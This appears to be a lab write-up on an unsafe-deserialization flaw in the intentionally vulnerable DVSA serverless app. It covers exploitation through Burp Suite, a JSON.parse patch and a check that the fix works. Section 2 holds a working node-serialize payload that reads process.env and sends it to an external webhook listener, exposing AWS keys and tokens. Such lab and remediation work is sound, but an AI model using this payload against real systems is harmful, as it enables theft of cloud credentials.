# Security Analysis: Event Injection (Unsafe Deserialization) in DVSA


## 1. Setup & Deployment
To replicate this analysis, you must first deploy the DVSA environment on AWS.

1.  **Deploy the Stack:** Use the AWS CloudFormation or SAM templates provided in the original DVSA repository to provision the infrastructure (API Gateway, Lambda, S3, Cognito).
2.  **Access the API:** Identify the `/order` endpoint from the API Gateway console.
3.  **Authentication:** Log into the DVSA frontend to obtain a valid **Authorization Bearer Token (JWT)**, which is required for interacting with the Order Manager.

---

## 2. Vulnerability Replication (Exploitation)
### The Root Cause
The `DVSA-ORDER-MANAGER` function uses the `node-serialize` package to process incoming request bodies. This package is vulnerable to code injection because it can evaluate strings as executable functions if they are prefixed with `_$$ND_FUNC$$_`.

### Step-by-Step Guide
1.  **Intercept the Request:**
    Open **Burp Suite** and navigate to the DVSA frontend. Go to "My Orders" and intercept the `POST` request sent to `/order`.
2.  **Identify the Sink:**
    The backend code at `functions/DVSA-ORDER-MANAGER/handler.js` uses `serialize.unserialize(event.body)`. This is where the malicious input is executed.
3.  **Craft the Malicious Payload:**
    Prepare a payload that collects environment variables (`process.env`) and sends them to an external listener (e.g., [Webhook.site](https://webhook.site)).
    ```json
    {
      "action": "_$$ND_FUNC$$_function() { const env = JSON.stringify(process.env); require('https').get('https://webhook.site/YOUR_ID?data=' + Buffer.from(env).toString('base64')); }()"
    }
    ```
4.  **Execute the Attack:**
    Send the modified request via **Burp Repeater**.
5.  **Confirm Exfiltration:**
    Monitor your Webhook.site dashboard. A new request should arrive containing a Base64-encoded string. Use **CyberChef** to decode the data, which will reveal sensitive information including `AWS_ACCESS_KEY_ID`, `AWS_SESSION_TOKEN`, and user JWTs.

---

## 3. Remediation & Patching
### The Fix Strategy
To secure the application, we implement **Safe Deserialization**. We replace the `node-serialize` library with the native `JSON.parse()` method, which treats all input strictly as data and does not support function evaluation.

### Technical Implementation
1.  **Locate the File:** Navigate to `functions/DVSA-ORDER-MANAGER/handler.js` in the AWS Lambda console.
2.  **Modify the Code:** Remove the `node-serialize` requirement and update the parsing logic.

#### Crucial Patch Code:
```javascript
// REMOVED: const serialize = require('node-serialize');

// ... inside the handler function ...

// PATCHED LOGIC: Use JSON.parse for safe data handling
let req;
try {
    req = typeof event.body === 'string' ? JSON.parse(event.body) : (event.body || {});
} catch (e) {
    return { statusCode: 400, body: JSON.stringify({ message: "Invalid JSON" }) };
}

// Ensure the code no longer calls serialize.unserialize(event.headers) or event.body
```

3.  **Deploy:** Click the **Deploy** button in the Lambda console to apply the changes.

---

## 4. Verification After Fix
1.  **Repeat the Exploit Attempt:**
    Send the same malicious `_$$ND_FUNC$$_` payload using Burp Repeater.
2.  **Observe Results:**
    * **Backend Response:** The API should return an "unknown action" error or a `400 Bad Request`.
    * **Attacker Dashboard:** Check Webhook.site. No new requests should be received, proving that code execution failed.
3.  **Functional Check:**
    Navigate to the frontend and view "My Orders." The orders should load normally, confirming that legitimate traffic is still handled correctly by `JSON.parse()`.

---

## Security Best Practices
* **Avoid Unsafe Packages:** Never use libraries like `node-serialize` or `unserialize` on user-controlled data.
* **Principle of Least Privilege:** Minimize the permissions of the Lambda Execution Role to ensure that even if code execution is achieved, the attacker cannot access other AWS resources.
* **Input Validation:** Implement strict schema validation (e.g., using Joi or AJV) to ensure only expected fields are processed.

---
